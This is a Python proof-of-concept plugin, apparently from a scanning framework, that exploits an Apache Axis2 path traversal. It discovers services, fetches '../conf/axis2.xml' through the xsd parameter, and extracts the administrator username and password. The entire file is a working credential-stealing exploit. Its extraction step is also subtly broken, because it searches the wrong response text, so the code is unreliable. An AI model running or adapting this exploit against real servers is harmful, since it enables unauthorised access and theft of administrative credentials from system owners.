#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import re
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'axis2_download'
        self.keyword = ['axis2']
        self.info = 'axis2 download'
        self.type = VUL_TYPE.INFO
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/axis2/services/'),
                self.url_normpath(self.base_url, './services/'),
                self.url_normpath(self.url, './services/'),
                self.url_normpath(self.url, './axis2/services/'),
            ]))
            for path in path_list:
                url = path + '/listServices'
                async with ClientSession() as session:
                    async with session.get(url=url) as res:
                        if res :
                            text = await res.text()
                            m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', text)
                            if m!=None and m.group(1):
                                server_str = m.group(1)
                                read_url = path + '/%s?xsd=../conf/axis2.xml' % (server_str)
                                async with session.get(url=read_url) as res1:
                                    if res1:
                                        text1 = await res1.text()
                                        if 'axisconfig' in str(text1):
                                            user = re.search('<parameter name="userName">(.*?)</parameter>', text)
                                            password = re.search('<parameter name="password">(.*?)</parameter>', text)
                                            self.flag = 1
                                            self.req.append({"info": "info"})
                                            self.res.append({"info": read_url, "key": ":".join([user.group(1), password.group(1)])})
                                            break